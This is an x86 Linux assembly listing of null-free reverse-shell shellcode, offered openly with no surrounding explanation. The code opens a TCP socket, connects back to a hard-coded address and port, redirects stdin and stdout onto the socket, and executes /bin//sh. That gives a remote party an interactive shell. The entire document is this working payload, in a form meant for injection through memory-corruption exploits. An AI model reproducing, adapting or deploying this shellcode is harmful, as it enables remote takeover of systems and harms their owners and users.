; ia32 nullfree reverse connect shell(code)
global _start

_start:

xor eax, eax
mov al, 0x66 ; socketcall
xor ebx, ebx
push ebx ; default protocol
inc ebx ; SYS_SOCKET
push ebx ; SOCK_STREAM 
push BYTE 2 ; PF_INET
mov ecx, esp
int 0x80

mov esi, eax ; esi = fd of socket

mov al, 0x66
mov bl, 3 ; SYS_CONNECT
push DWORD 0x0101017F ; 127.1.1.1
push WORD 0x901F ; 8080
push WORD 2 ; 
mov ecx, esp
push BYTE 16 ; sizeof(strcut sockaddr_in)
push ecx
push esi ; esi == fd of socket
mov ecx, esp
int 0x80 

mov ebx, esi ; esi == fd of socket 
mov al, 0x3f ; dup2
xor ecx, ecx ; 0 == stdin
int 0x80

mov al, 0x3f
inc ecx; 1 == stdout
int 0x80

mov al, 11 ; execve
xor edx, edx
push edx ; string end 
push DWORD 0x68732f2f ; "//sh"
push DWORD 0x6e69622f ; "/bin"
mov ebx, esp
push edx
mov ecx, esp
push edx
mov edx, esp
int 0x80

